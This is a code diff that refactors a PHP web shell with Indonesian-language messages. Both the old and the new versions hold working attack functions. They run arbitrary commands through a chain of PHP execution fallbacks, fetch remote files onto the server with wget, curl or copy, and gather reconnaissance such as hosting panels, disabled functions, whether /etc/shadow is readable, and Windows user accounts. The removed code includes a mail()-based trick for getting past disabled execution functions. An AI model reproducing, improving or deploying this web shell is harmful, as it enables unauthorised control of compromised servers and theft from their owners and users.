+        'loader' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="' . $c . '"><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="#2be2ff" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>',
+    ];
+    return $icons[$a] ?? '';
 }
-function cwd(){
-	$path = '';
-	if(AvFunc(array('realpath'))){$path = @realpath('.'); } else { if(AvFunc(array('getcwd'))){$path = @getcwd();}}
-	return $path;
+function cwd() {
+    if (function_exists('realpath')) {
+        return realpath('.');
+    }
+    if (function_exists('getcwd')) {
+        return getcwd();
+    }
+    return '';
 }
+
 function listdirs($dir) {
-	if(AvFunc(array('opendir','readdir','closedir'))){
-		if(@is_dir($dir)){
-			if($handle = @opendir($dir)) {
-				while (($file = @readdir($handle)) !== false) {
-					$files[] = $file;
-				}
-				@closedir($handle);
-			}
-		}
-	} else {
-		if(AvFunc(array('scandir'))){
-			$files = @scandir($dir);
-		}
-	}
-	return isset($files) ? $files : [];
+    if (function_exists('scandir')) {
+        return scandir($dir);
+    }
+
+    if (!is_dir($dir) || !function_exists('opendir')) {
+        return [];
+    }
+
+    $files = [];
+    if ($handle = opendir($dir)) {
+        while (($file = readdir($handle)) !== false) {
+            $files[] = $file;
+        }
+        closedir($handle);
+    }
+    return $files;
 }
 function disFunc(){ $df = function_exists('ini_get') ? @ini_get('disable_functions') : ''; return (!empty($df) ? explode(',', $df) : array());}
-function AvFunc($list = array()){
-	foreach($list as $entry){
-		if(function_exists($entry) && !in_array($entry, disFunc())){
-			return true;
-		}
-	}
-	return false;
+function isFunctionEnabled($functionName) {
+    if (!function_exists($functionName)) {
+        return false;
+    }
+    $disabledFunctions = @ini_get('disable_functions');
+    if ($disabledFunctions) {
+        $disabled = explode(',', $disabledFunctions);
+        return !in_array($functionName, array_map('trim', $disabled));
+    }
+    return true;
 }
-function serverSecInfo(){
-	function serverPanel(){
-		$pn = array('/usr/local/cpanel' => 'cPanel', '/usr/local/hpanel' => 'hPanel (Hostinger)', '/usr/local/psa' => 'Plesk', '/usr/local/webuzo' => 'Webuzo', '/usr/local/vesta' => 'Vesta CP', '/usr/share/webmin' => 'Virtualmin', '/www/server/panel' => 'aaPanel', '/opt/neoistone' => 'NS Panel', '/etc/neoistone' => 'NS Panel', '/usr/local/neoistone' => 'NS Panel', '/usr/local/mgr5' => 'ISP Manager', '/usr/local/mgr6' => 'ISP Manager', '/usr/local/home/admispconfig'	=> 'ISP Config', '/usr/local/directadmin' => 'Direct Admin', '/usr/local/solusvm/www' => 'SolusVM', '/usr/local/lxlabs/kloxo' => 'Kloxo', '/usr/local/cwp' => 'CentOS WebPanel', '/usr/local/cwpsrv' => 'CentOS WebPanel', '/var/www/html/froxlor-latest' => 'Froxlor', '/var/www/html/froxlor' => 'Froxlor', '/etc/ajenti/' => 'Ajenti');
-		foreach($pn as $kpn => $vpn){
-			if(@is_dir($kpn)){
-				$npn[] = $vpn;
-			}
-		}
-		return isset($npn) ? implode(', ', array_values(array_unique($npn))) : 'Unknown';
-	}
-	function showInf($n, $v){
-		$x = '';
-		$v = trim($v);
-		if($v){
-			$x .= '<p class="mt-3 mb-0 text-cyan">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">'.$v.'</footer>' : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">'.$v.'</pre></footer>';
-		}
-		return $x;
-	}
-	if(AvFunc(array('mysql_get_client_info'))){$temp[] = "MySQL (" . @mysql_get_client_info(). ")";}
-	if(AvFunc(array('mysqli_get_client_info'))){$temp[] = "MySQLi (" . @mysqli_get_client_info(). ")";}
-	if(AvFunc(array('mssql_connect'))){$temp[] = "MSSQL";}
-	if(AvFunc(array('pg_connect'))){$temp[] = "PostgreSQL";}
-	if(AvFunc(array('oci_connect'))){$temp[] = "Oracle";}
-	if(AvFunc(array('odbc_connect'))){$temp[] = "odbc";}
-	if(AvFunc(array('sqlite_open'))){$temp[] = "SQLite";}
-	if(class_exists('SQLite3')){$temp[] = "SQLite3";}
-	if(class_exists('PDO')){$temp[] = "PDO";}
-	$sInfo[] = showInf('System', @php_uname());
-	$sInfo[] = showInf('Server software', (AvFunc(array('getenv')) ? @getenv('SERVER_SOFTWARE') : 'Unknown'));
-	$sInfo[] = showInf('Server ip', (AvFunc(array('gethostbyname')) ? @gethostbyname($_SERVER['HTTP_HOST']) : 'Unknown'));
-	$sInfo[] = showInf('Server panel', serverPanel());
-	if(AvFunc(array('ini_get'))){
-		$sInfo[] = showInf('Open base dir', @ini_get('open_basedir'));
-		$sInfo[] = showInf('Safe mode', (@ini_get('safe_mode') ? 'ON' : 'OFF'));
-		$sInfo[] = showInf('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
-		$sInfo[] = showInf('Safe mode include dir', @ini_get('safe_mode_include_dir'));		
-	}
-	$sInfo[] = showInf('PHP Version', @phpversion());
-	$sInfo[] = showInf('Disabled PHP Functions', (count(disFunc())>0 ? implode(', ', disFunc()) : 'none'));
-	$sInfo[] = showInf('Loaded Apache modules', (AvFunc(array('apache_get_modules')) ? implode(', ', @apache_get_modules()) : '-'));
-	$sInfo[] = showInf('cURL support', (AvFunc(array('curl_version')) ? 'Yes ('.curl_version()['version'].')' : 'No'));
-	$sInfo[] = showInf('Databases', (isset($temp) ? implode(', ',$temp) : 'Unknown'));
-	if($GLOBALS['os'] == 'nix'){
-		$sInfo[] = showInf('OS Version', (AvFunc(array('file_get_contents')) ? @file_get_contents('/proc/version') : 'Unknown'));
-		$sInfo[] = showInf('Distro name', (AvFunc(array('file_get_contents')) ? @file_get_contents('/etc/issue.net') : 'Unknown'));
-		if(AvFunc(array('is_readable'))){
-			$sInfo[] = showInf('Readable /etc/passwd', (@is_readable('/etc/passwd') ? "Yes" : "No"));
-			$sInfo[] = showInf('Readable /etc/shadow', (@is_readable('/etc/shadow') ? "Yes" : "No"));			
-		}
-	} else {
-		$sInfo[] = showInf('OS Version', base64_decode(perintahnya("ver", $_SESSION['path'])['stdout']));
-		if(AvFunc(array('iconv'))){
-			$sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net accounts", $_SESSION['path'])['stdout'])));
-			$sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net user", $_SESSION['path'])['stdout'])));
-			$sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8',base64_decode(perintahnya("systeminfo", $_SESSION['path'])['stdout'])));
-		}
-	}
-	return array_values(array_filter(array_unique($sInfo)));
+
+function AvFunc($list = []) {
+    foreach ($list as $entry) {
+        if (isFunctionEnabled($entry)) {
+            return true;
+        }
+    }
+    return false;
 }
-function transferFile($xurl, $xpath, $xname){
-	@set_time_limit(0);
-	$fName = $xpath."/".$xname;
-	if(is_writable($xpath)){
-		if(AvFunc(array('file_put_contents', 'file_get_contents'))){
-			if(file_exists($fName)){@unlink($fName);}
-			$upfiles = @file_put_contents($fName, @file_get_contents($xurl));
-			if($upfiles){
-				$outs[] = file_exists($fName) ? $xname." uploaded!" : $xname." failed!";
-			} else {
-				$outs[] = "handling url failed!";
-			}
-		} else if(AvFunc(array('copy'))){
-			if(file_exists($fName)){@unlink($fName);}
-			$outs[] = @copy($xurl, $fName) ? $xname." uploaded!" : $xname." failed!";
-		} else if(AvFunc(array('curl_version', 'fopen', 'fclose'))){
-			if(file_exists($fName)){@unlink($fName);}
-			$ch = curl_init($xurl);
-			$fp = @fopen($fName, 'w');
-			curl_setopt($ch, CURLOPT_FILE, $fp);
-			curl_setopt($ch, CURLOPT_HEADER, 0);
-			curl_exec($ch);
-			curl_close($ch);
-			@fclose($fp);
-			$outs[] = file_exists($fName) ? $xname." uploaded!" : $xname." failed!";
-		} else {
-			if(file_exists($fName)){@unlink($fName);}
-			$sendreq = perintahnya('wget -c '.$xurl.' -O '.$xname, $xpath);
-			$outs[] = isset($sendreq['stdout']) && strlen($sendreq['stdout'])>2 ? $xname." uploaded!" : $xname." failed!";
-		}
-	} else {
-		$outs[] = $xname.' failed!';
-	}
-	return isset($outs) ? $outs : array($xname.' failed!');
+function serverSecInfo() {
+    $sInfo = [];
+
+    function showInf($n, $v) {
+        $v = trim($v);
+        if (empty($v)) {
+            return '';
+        }
+        $content = (strpos($v, "\n") === false)
+            ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">' . htmlspecialchars($v) . '</footer>'
+            : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">' . htmlspecialchars($v) . '</pre></footer>';
+        return '<p class="mt-3 mb-0 text-cyan">' . htmlspecialchars($n) . ': </p>' . $content;
+    }
+
+    $sInfo[] = showInf('System', php_uname());
+    $sInfo[] = showInf('Server software', $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown');
+    if (isFunctionEnabled('gethostbyname')) {
+        $sInfo[] = showInf('Server ip', gethostbyname($_SERVER['HTTP_HOST']));
+    }
+
+    $panels = [
+        '/usr/local/cpanel' => 'cPanel', '/usr/local/hpanel' => 'hPanel (Hostinger)',
+        '/usr/local/psa' => 'Plesk', '/usr/local/webuzo' => 'Webuzo',
+        '/usr/local/vesta' => 'Vesta CP', '/usr/share/webmin' => 'Virtualmin',
+        '/www/server/panel' => 'aaPanel', '/opt/neoistone' => 'NS Panel',
+        '/etc/neoistone' => 'NS Panel', '/usr/local/neoistone' => 'NS Panel',
+        '/usr/local/mgr5' => 'ISP Manager', '/usr/local/mgr6' => 'ISP Manager',
+        '/usr/local/home/admispconfig' => 'ISP Config', '/usr/local/directadmin' => 'Direct Admin',
+        '/usr/local/solusvm/www' => 'SolusVM', '/usr/local/lxlabs/kloxo' => 'Kloxo',
+        '/usr/local/cwp' => 'CentOS WebPanel', '/usr/local/cwpsrv' => 'CentOS WebPanel',
+        '/var/www/html/froxlor-latest' => 'Froxlor', '/var/www/html/froxlor' => 'Froxlor',
+        '/etc/ajenti/' => 'Ajenti'
+    ];
+    $foundPanels = [];
+    foreach ($panels as $path => $panel) {
+        if (is_dir($path)) {
+            $foundPanels[] = $panel;
+        }
+    }
+    $sInfo[] = showInf('Server panel', empty($foundPanels) ? 'Unknown' : implode(', ', array_unique($foundPanels)));
+
+    if (isFunctionEnabled('ini_get')) {
+        $sInfo[] = showInf('Open base dir', ini_get('open_basedir'));
+        $sInfo[] = showInf('Safe mode', ini_get('safe_mode') ? 'ON' : 'OFF');
+        $sInfo[] = showInf('Safe mode exec dir', ini_get('safe_mode_exec_dir'));
+        $sInfo[] = showInf('Safe mode include dir', ini_get('safe_mode_include_dir'));
+    }
+
+    $sInfo[] = showInf('PHP Version', phpversion());
+    $sInfo[] = showInf('Disabled PHP Functions', implode(', ', disFunc()));
+
+    if (isFunctionEnabled('apache_get_modules')) {
+        $sInfo[] = showInf('Loaded Apache modules', implode(', ', apache_get_modules()));
+    }
+
+    if (isFunctionEnabled('curl_version')) {
+        $curlVer = curl_version();
+        $sInfo[] = showInf('cURL support', 'Yes (' . $curlVer['version'] . ')');
+    }
+
+    $databases = [];
+    if (isFunctionEnabled('mysql_get_client_info')) $databases[] = "MySQL (" . mysql_get_client_info() . ")";
+    if (class_exists('mysqli')) $databases[] = "MySQLi (" . mysqli_get_client_info() . ")";
+    if (isFunctionEnabled('mssql_connect')) $databases[] = "MSSQL";
+    if (isFunctionEnabled('pg_connect')) $databases[] = "PostgreSQL";
+    if (isFunctionEnabled('oci_connect')) $databases[] = "Oracle";
+    if (isFunctionEnabled('odbc_connect')) $databases[] = "ODBC";
+    if (isFunctionEnabled('sqlite_open')) $databases[] = "SQLite";
+    if (class_exists('SQLite3')) $databases[] = "SQLite3";
+    if (class_exists('PDO')) $databases[] = "PDO";
+    $sInfo[] = showInf('Databases', implode(', ', $databases));
+
+    if ($GLOBALS['os'] === 'nix') {
+        if (isFunctionEnabled('file_get_contents')) {
+            $sInfo[] = showInf('OS Version', @file_get_contents('/proc/version'));
+            $sInfo[] = showInf('Distro name', @file_get_contents('/etc/issue.net'));
+        }
+        if (isFunctionEnabled('is_readable')) {
+            $sInfo[] = showInf('Readable /etc/passwd', is_readable('/etc/passwd') ? "Yes" : "No");
+            $sInfo[] = showInf('Readable /etc/shadow', is_readable('/etc/shadow') ? "Yes" : "No");
+        }
+    } else {
+        $sInfo[] = showInf('OS Version', base64_decode(perintahnya("ver", $_SESSION['path'])['stdout']));
+        if (isFunctionEnabled('iconv')) {
+            $sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net accounts", $_SESSION['path'])['stdout'])));
+            $sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net user", $_SESSION['path'])['stdout'])));
+            $sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("systeminfo", $_SESSION['path'])['stdout'])));
+        }
+    }
+
+    return array_values(array_filter(array_unique($sInfo)));
 }
-function addDirToZip($zip, $dir, $basePath){
-	if(class_exists('ZipArchive')){
-		$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
-		foreach ($iterator as $file) {
-			$relativePath = $dir . '/' . $iterator->getSubPathName();
-			if ($file->isDir()) {
-				$zip->addEmptyDir($relativePath);
-			} else {
-				$zip->addFile($file->getRealPath(), $relativePath);
-			}
-		}
-	}
+function transferFile($xurl, $xpath, $xname) {
+    set_time_limit(0);
+    $fName = $xpath . "/" . $xname;
+
+    if (!is_writable($xpath)) {
+        return [$xname . ' failed! (permission denied)'];
+    }
+
+    $methods = [
+        'file_put_contents' => function ($url, $file) {
+            return file_put_contents($file, file_get_contents($url));
+        },
+        'copy' => function ($url, $file) {
+            return copy($url, $file);
+        },
+        'curl' => function ($url, $file) {
+            if (!function_exists('curl_init')) return false;
+            $ch = curl_init($url);
+            $fp = fopen($file, 'w');
+            curl_setopt($ch, CURLOPT_FILE, $fp);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            $success = curl_exec($ch);
+            curl_close($ch);
+            fclose($fp);
+            return $success;
+        },
+        'wget' => function ($url, $file, $path) {
+            $response = perintahnya('wget -c ' . escapeshellarg($url) . ' -O ' . escapeshellarg($file), $path);
+            return !empty($response['stdout']);
+        }
+    ];
+
+    foreach ($methods as $method => $callback) {
+        if (file_exists($fName)) {
+            @unlink($fName);
+        }
+        if ($callback($xurl, $fName, $xpath)) {
+            return [file_exists($fName) ? $xname . " uploaded!" : $xname . " failed!"];
+        }
+    }
+
+    return [$xname . ' failed! (no suitable method found)'];
 }
-function encode($value,$keys) {if(!$value){return false;}$key = sha1($keys);$strLen = strlen($value);$keyLen = strlen($key);$j = 0;$crypttext = ''; for ($i = 0; $i < $strLen; $i++) {$ordStr = ord(substr($value, $i, 1));if ($j == $keyLen) {$j = 0;}$ordKey = ord(substr($key, $j, 1));$j++;$crypttext .= strrev(base_convert(dechex($ordStr + $ordKey), 16, 36));}return $crypttext;}
-function decode($value,$keys) {if(!$value){return false;}$key = sha1($keys);$strLen = strlen($value);$keyLen = strlen($key);$j = 0;$decrypttext = '';for ($i = 0; $i < $strLen; $i += 2) {$ordStr = hexdec(base_convert(strrev(substr($value, $i, 2)), 36, 16));if ($j == $keyLen) {$j = 0;}$ordKey = ord(substr($key, $j, 1));$j++;$decrypttext .= chr($ordStr - $ordKey);}return $decrypttext;}
-function generate($_a1a,$_a2a){ return $_a1a == 'encode' ? encode($_a2a,preg_replace('/[^a-zA-Z]/','',$GLOBALS['stitle'])) : decode($_a2a,preg_replace('/[^a-zA-Z]/','',$GLOBALS['stitle']));}
-function procopen($cmd){
-	$descspek = array(
-		1 => array("pipe", "w"),
-		0 => array("pipe", "r"),
-		2 => array("pipe", "w")
-	);
-	try {
-		if(AvFunc(array('proc_open','proc_close','fread','feof','fclose'))){
-			$process = @proc_open($cmd, $descspek, $pipes);
-			if(is_resource($process)){
-				$stdout = ""; $buffer = "";
-				do {
-					$buffer = fread($pipes[1], $GLOBALS['chunk_size']); $stdout = $stdout . $buffer;
-				} while ((!feof($pipes[1])) && (strlen($buffer) != 0));
-				$stderr = ""; $buffer = "";
-				do {
-					$buffer = fread($pipes[2], $GLOBALS['chunk_size']); $stderr = $stderr . $buffer;
-				} while ((!feof($pipes[2])) && (strlen($buffer) != 0));
-				fclose($pipes[1]);
-				fclose($pipes[2]);
-				$outr = !empty($stdout) ? $stdout : $stderr;
-			} else {
-				$outr = 'Gagal eksekusi pak!, proc_open failed!';
-			}
-			proc_close($process);
-		} else {
-			$outr = 'PHP proc_open function is disabled or no exists!';
-		}
-		echo $outr;
-	} catch(Exception $err){
-		echo 'error: '.$err->getMessage();
-	}
+function addDirToZip($zip, $dir, $basePath) {
+    if (!class_exists('ZipArchive')) {
+        return;
+    }
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    foreach ($iterator as $file) {
+        $relativePath = $basePath . '/' . $iterator->getSubPathName();
+        if ($file->isDir()) {
+            $zip->addEmptyDir($relativePath);
+        } else {
+            $zip->addFile($file->getRealPath(), $relativePath);
+        }
+    }
 }
-function fakemail($func, $cmd){
-	$tmpdir = str_replace('\\','/', @sys_get_temp_dir());
-	if(is_writable($tmpdir)){		
-		$cmds = "{$cmd} > {$tmpdir}/geiss.txt";
-		cf($tmpdir.'/geiss.sh', base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("#!/bin/sh\n{$cmds}","\r\t\0"))));
-		@chmod($tmpdir.'/geiss.sh', 0777);
-		if($func == 'mail'){
-			$send = @mail("root@root", "", "", "", '-H \"exec '.$tmpdir.'/geiss.sh\"');
-		} else {
-			$send = @mb_send_mail("root@root", "", "", "", '-H \"exec '.$tmpdir.'/geiss.sh\"');
-		}
-		if($send){@file_get_contents($tmpdir."/geiss.txt");}
-		return sleep(5);
-	}
-}
-function cf($f,$t){
-	if(AvFunc(array('fopen','fwrite','fputs','fclose'))){
-		$w=@fopen($f,"w");
-		if($w){
-			@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t));
-			@fclose($w);
-		}		
-	} else {
-		if(AvFunc(array('file_put_contents'))){
-			@file_put_contents($f,@base64_decode($t));
-		}		
-	}
+function executeCommand($cmd) {
+    $output = '';
+    $chunk_size = 4096;
+
+    if (isFunctionEnabled('proc_open')) {
+        $descriptors = [
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        $process = proc_open($cmd, $descriptors, $pipes);
+        if (is_resource($process)) {
+            $output .= stream_get_contents($pipes[1]);
+            $output .= stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+        }
+    } elseif (isFunctionEnabled('popen')) {
+        $handle = popen($cmd . ' 2>&1', 'r');
+        while (!feof($handle)) {
+            $output .= fread($handle, $chunk_size);
+        }
+        pclose($handle);
+    } elseif (isFunctionEnabled('shell_exec')) {
+        $output = shell_exec($cmd . ' 2>&1');
+    } elseif (isFunctionEnabled('exec')) {
+        exec($cmd . ' 2>&1', $lines);
+        $output = implode("\n", $lines);
+    } elseif (isFunctionEnabled('system')) {
+        ob_start();
+        system($cmd . ' 2>&1');
+        $output = ob_get_clean();
+    } elseif (isFunctionEnabled('passthru')) {
+        ob_start();
+        passthru($cmd . ' 2>&1');
+        $output = ob_get_clean();
+    }
+
+    return $output;
 }
 function expandPath($path) {
     if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ perintahnya("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
     return $path;
 }
-function perintahnya($cmdx, $path){
+function perintahnya($cmdx, $path) {
+    if (function_exists('chdir')) {
+        @chdir($path);
+    }
+
     $stdout = '';
-	if(AvFunc(array('chdir'))){
-		if(preg_match("/^\s*cd\s*(2>&1)?$/", $cmdx)){
-			@chdir(expandPath("~"));
-		} else if(preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmdx)){
-			@chdir($path);
-			preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmdx, $match);
-			@chdir(expandPath($match[1]));
-		} else {
-			@chdir($path);
-			$stdout = ex($cmdx);
-		}
-	}
-	$cfg = array('username' => 'Z190T', 'hostname' => 'shell');
-	if($GLOBALS['os'] == 'nix'){
-		if(AvFunc(array('posix_getpwuid','posix_geteuid'))){ $pwuid = @posix_getpwuid(@posix_geteuid());if($pwuid !== false){ $cfg['username'] = $pwuid['name'];}}
-	} else {
-		if(AvFunc(array('getenv'))){ $username = @getenv('USERNAME');if($username !== false){ $cfg['username'] = $username;}}
-	}
-	if(AvFunc(array('gethostname'))){ $hostname = @gethostname(); if($hostname !== false){ $cfg['hostname'] = $hostname;}}
-	$_SESSION['path'] = AvFunc(array('getcwd')) ? str_replace('\\','/', cwd()) : $_SERVER['DOCUMENT_ROOT'];
-    return array('userhost' => base64_encode($cfg['username']."@".$cfg['hostname']), 'path' => base64_encode($_SESSION['path']), 'stdout' => base64_encode($stdout));
+    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmdx)) {
+        if (function_exists('chdir')) {
+            @chdir(expandPath("~"));
+        }
+    } elseif (preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmdx, $match)) {
+        if (function_exists('chdir')) {
+            @chdir(expandPath($match[1]));
+        }
+    } else {
+        $stdout = executeCommand($cmdx);
+    }
+
+    $user = 'unknown';
+    if (isFunctionEnabled('posix_getpwuid') && isFunctionEnabled('posix_geteuid')) {
+        $pwuid = posix_getpwuid(posix_geteuid());
+        $user = $pwuid['name'];
+    } elseif (isFunctionEnabled('getenv')) {
+        $user = getenv('USERNAME') ?: 'unknown';
+    }
+
+    $hostname = isFunctionEnabled('gethostname') ? gethostname() : 'localhost';
+    $_SESSION['path'] = cwd();
+
+    return [
+        'userhost' => base64_encode($user . "@" . $hostname),
+        'path' => base64_encode($_SESSION['path']),
+        'stdout' => base64_encode($stdout)
+    ];
 }
-function ex($init){
-	$out = '';
-	if(!preg_match('/2>/', $init)){$init.=' 2>&1';}
-	$tmpout = `$init`;
-	if(strlen($tmpout)>0){
-		$out = $tmpout;
-	} else {
-		foreach(array('proc_open', 'popen', 'exec', 'passthru', 'system', 'shell_exec', 'mail', 'mb_send_mail') as $c){
-			if($c == 'proc_open'){
-				if(AvFunc(array($c, 'ob_start', 'ob_get_clean'))){ob_start(); procopen($init); $out=ob_get_clean(); break;}
-			} else if($c == 'exec'){
-				if(AvFunc(array($c))){@$c($init,$outs); $out=@join("\n",$outs); break;}
-			} else if($c == 'system' || $c == 'passthru'){
-				if(AvFunc(array('system', 'passthru', 'ob_start', 'ob_get_clean'))){ob_start(); @$c($init); $out=ob_get_clean(); break;}
-			} else if($c == 'shell_exec'){
-				if(AvFunc(array($c))){$out=$c($init); break;}
-			} else if($c == 'mail' || $c == 'mb_send_mail'){
-				if(AvFunc(array('mail', 'mb_send_mail', 'ob_start', 'ob_get_clean'))){ob_start(); fakemail("{$c}",$init); $out=ob_get_clean(); break;}
-			} else {
-				if(AvFunc(array($c, 'feof', 'fread', 'fclose'))){if(is_resource($f = @$c($init, "r"))){$out=''; while(!@feof($f)){$out.=fread($f, $GLOBALS['chunk_size']);}fclose($f);} break;}
-			}
-		}
-		if(strlen($out)<=0){
-			$out = 'gak bisa jalanin perintah, coba cek <em>disable_functions</em> server ini!';
-		}
-	}
-	return $out;
-}
-function statusnya($file){
-	$stx = @fileperms($file);
-	if(($stx & 0xC000) == 0xC000){ $info = 's'; /* Socket */ }
-	elseif(($stx & 0xA000) == 0xA000){ $info = 'l'; /* Symbolic Link */ }
-	elseif(($stx & 0x8000) == 0x8000){ $info = '-'; /* Regular */ }
-	elseif(($stx & 0x6000) == 0x6000){ $info = 'b'; /* Block special */ }
-	elseif(($stx & 0x4000) == 0x4000){ $info = 'd'; /* Directory */ }
-	elseif(($stx & 0x2000) == 0x2000){ $info = 'c'; /* Character special */ }
-	elseif(($stx & 0x1000) == 0x1000){ $info = 'p'; /* FIFO pipe */ }
-	else { $info = 'u'; /* Unknown */ }
-	/* Owner */
-	$info .= ($stx & 0x0100) ? 'r' : '-';
-	$info .= ($stx & 0x0080) ? 'w' : '-';
-	$info .= (($stx & 0x0040) ? (($stx & 0x0800) ? 's' : 'x' ) : (($stx & 0x0800) ? 'S' : '-'));
-	/* Group */
-	$info .= ($stx & 0x0020) ? 'r' : '-';
-	$info .= ($stx & 0x0010) ? 'w' : '-';
-	$info .= (($stx & 0x0008) ? (($stx & 0x0400) ? 's' : 'x' ) : (($stx & 0x0400) ? 'S' : '-'));
-	/* World */
-	$info .= ($stx & 0x0004) ? 'r' : '-';
-	$info .= ($stx & 0x0002) ? 'w' : '-';
-	$info .= (($stx & 0x0001) ? (($stx & 0x0200) ? 't' : 'x' ) : (($stx & 0x0200) ? 'T' : '-'));
-	return $info;
+function statusnya($file) {
+    $perms = @fileperms($file);
+
+    if ($perms === false) {
+        return 'u?????????';
+    }
+
+    $info = '';
+    // File type
+    if (($perms & 0xC000) == 0xC000) $info = 's'; // Socket
+    elseif (($perms & 0xA000) == 0xA000) $info = 'l'; // Symbolic Link
+    elseif (($perms & 0x8000) == 0x8000) $info = '-'; // Regular
+    elseif (($perms & 0x6000) == 0x6000) $info = 'b'; // Block special
+    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; // Directory
+    elseif (($perms & 0x2000) == 0x2000) $info = 'c'; // Character special
+    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; // FIFO pipe
+    else $info = 'u'; // Unknown
+
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
 }
 function stColor($f){$colors = '';if(!@is_readable($f)){$colors = 'text-danger';} else if(!@is_writable($f)){$colors = 'text-warning';} else {$colors = 'text-success';}return $colors;}
-function owner($filename){
-	$owner = AvFunc(array('fileowner')) ? @fileowner($filename) : '?';
-	$group = AvFunc(array('filegroup')) ? @filegroup($filename) : '?';
-	if(AvFunc(array('posix_getpwuid'))){
-		$owner = @posix_getpwuid($owner);
-		$owner = isset($owner['name']) ? $owner['name'] : '?';
-	}
-	if(AvFunc(array('posix_getgrgid'))){
-		$group = @posix_getgrgid($group);
-		$group = isset($group['name']) ? $group['name'] : '?';
-	}
-	return array('owner' => $owner, 'group' => $group);
+function owner($filename) {
+    $owner = '?';
+    $group = '?';
+
+    if (isFunctionEnabled('fileowner')) {
+        $ownerId = @fileowner($filename);
+        if ($ownerId !== false && isFunctionEnabled('posix_getpwuid')) {
+            $ownerInfo = @posix_getpwuid($ownerId);
+            if ($ownerInfo) {
+                $owner = $ownerInfo['name'];
+            }
+        }
+    }
+
+    if (isFunctionEnabled('filegroup')) {
+        $groupId = @filegroup($filename);
+        if ($groupId !== false && isFunctionEnabled('posix_getgrgid')) {
+            $groupInfo = @posix_getgrgid($groupId);
+            if ($groupInfo) {
+                $group = $groupInfo['name'];
+            }
+        }
+    }
+
+    return ['owner' => $owner, 'group' => $group];
 }
-function sizeFilter($bytes){
-    $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
-    for($i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++);
-    return(round($bytes, 2) . " " . $label[$i]);
+function sizeFilter($bytes) {
+    if ($bytes === false) {
+        return 'N/A';
+    }
+    $label = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    $i = 0;
+    while ($bytes >= 1024 && $i < count($label) - 1) {
+        $bytes /= 1024;
+        $i++;
+    }
+    return round($bytes, 2) . " " . $label[$i];
 }
-function countDir($filename){return @count(listdirs($filename)) - 2;}
-function xrmdir($dir){
-	$items = listdirs($dir);
-	if($items){
-		foreach($items as $item) {
-			if($item === '.' || $item === '..'){
-				continue;
-			}
-			$path = $dir.'/'.$item;
-			if(@is_dir($path)){ xrmdir($path); } else { @unlink($path); }
-		}
-		rmdir($dir);
-	}
+
+function countDir($filename) {
+    $files = listdirs($filename);
+    return is_array($files) ? count($files) - 2 : 0;
+}
+
+function xrmdir($dir) {
+    $items = listdirs($dir);
+    if (!is_array($items)) {
+        return;
+    }
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $path = $dir . '/' . $item;
+        if (is_dir($path)) {
+            xrmdir($path);
+        } else {
+            @unlink($path);
+        }
+    }
+    @rmdir($dir);
 }
 function gandakanDir($source, $destination) {
-    if(!@is_dir($source)){
+    if (!is_dir($source)) {
         return false;
     }
-    if(!file_exists($destination)){
